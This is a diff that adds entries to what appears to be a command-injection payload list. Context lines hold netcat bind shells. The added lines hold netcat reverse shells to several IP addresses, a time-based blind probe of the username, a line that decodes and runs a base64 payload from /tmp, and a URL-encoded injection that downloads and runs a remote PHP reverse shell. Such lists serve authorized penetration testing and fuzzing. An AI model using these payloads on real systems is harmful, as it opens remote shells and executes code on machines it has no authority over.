@@ -272,6 +272,14 @@ nc -lvvp 4445 -e /bin/sh &
 nc -lvvp 4446 -e /bin/sh|
 nc -lvvp 4447 -e /bin/sh;
 nc -lvvp 4448 -e /bin/sh&
+nc -e /bin/bash 192.168.225.5 7777
+nc -e /bin/sh 135.23.158.130 8888
+nc -e /bin/sh 10.2.56.7 3333
+nc -e /bin/sh 3.45.67.9 8000
+nc -e /bin/sh 101.50.90.7 6000
+time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
+%0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
 \necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
 \necho INJECTX\nexit\n\033[2Asleep 5\n
 \necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
